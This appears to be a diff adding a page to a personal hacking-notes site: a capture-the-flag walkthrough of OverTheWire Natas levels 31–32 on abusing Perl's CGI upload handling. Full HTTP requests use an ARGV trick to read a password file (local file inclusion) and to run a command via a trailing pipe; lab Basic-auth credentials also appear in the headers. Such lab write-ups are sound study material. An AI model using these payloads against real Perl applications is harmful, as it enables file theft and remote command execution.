@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Perl</h1>
+            <p>Perl is a programming language designed by Larry Wall in 1987. Perl borrows features from the C language, the Bourne Shell, AWK, sed, Lisp, and, to a lesser extent, many other programming languages.</p>
+        </div>
+        <div class="notion-body">
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>The pinnacle attack</h3>
+                <p>The pinnacle attack (Presented in the Perl Jan 2) allows trick the function $cgi->upload('file') in order to perform RCE or LFI</p>
+                <p>This is performed by passing an additional file as a parameter.</p>
+                <ul>
+                    <h4>LFI</h4>
+                    <p>Take a look at the request. Apart from the file that is being uploaded we used ARGV to pass another file by the url parameter </p>
+                    <pre><code class="language-url">POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
+Host: natas31.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------10540672251980217723772833326
+Content-Length: 677
+Origin: http://natas31.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
+Connection: keep-alive
+Referer: http://natas31.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS2.1.s1754900659$o19$g0$t1754900659$j60$l0$h0; _ga=GA1.1.1589158299.1753534300
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+-----------------------------10540672251980217723772833326
+Content-Disposition: form-data; name="file";
+Content-Type: text/csv
+
+ARGV
+-----------------------------10540672251980217723772833326
+Content-Disposition: form-data; name="file"; filename="username.csv"
+Content-Type: text/csv
+
+Username; Identifier;First name;Last name
+booker12;9012;Rachel;Booker
+grey07;2070;Laura;Grey
+johnson81;4081;Craig;Johnson
+jenkins46;9346;Mary;Jenkins
+smith79;5079;Jamie;Smith
+
+
+-----------------------------10540672251980217723772833326
+Content-Disposition: form-data; name="submit"
+
+Upload
+-----------------------------10540672251980217723772833326--
+</code></pre> 
+                    <h4>RCE</h4>
+                    <p>Take a look at the request. Now we also use the ARGV to pass a parameter but instead of a file we use</p>
+                    <pre><code class="language-bash">./getpassword%20|</code></pre>
+                    <p>Remember to always use command%20|</p>
+                    <pre><code class="language-url">POST /index.pl?./getpassword%20| HTTP/1.1
+Host: natas32.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------16932740703391401763649088328
+Content-Length: 570
+Origin: http://natas32.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
+Connection: keep-alive
+Referer: http://natas32.natas.labs.overthewire.org/
+Cookie: _ga_RD0K2239G0=GS2.1.s1756111010$o20$g1$t1756111027$j43$l0$h0; _ga=GA1.1.1589158299.1753534300
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+
+-----------------------------16932740703391401763649088328
+
+Content-Disposition: form-data; name="file"
+
+ARGV
+-----------------------------16932740703391401763649088328
+
+Content-Disposition: form-data; name="file"; filename="username.csv"
+Content-Type: text/csv
+
+
+Username; Identifier;First name;Last name
+booker12;9012;Rachel;Booker
+grey07;2070;Laura;Grey
+johnson81;4081;Craig;Johnson
+jenkins46;9346;Mary;Jenkins
+smith79;5079;Jamie;Smith
+
+
+-----------------------------16932740703391401763649088328
+Content-Disposition: form-data; name="submit"
+
+
+Upload
+-----------------------------16932740703391401763649088328--</code></pre>
+                </ul>
+            </ul>
+        </div>
+    </div>
+</body>
+</html>
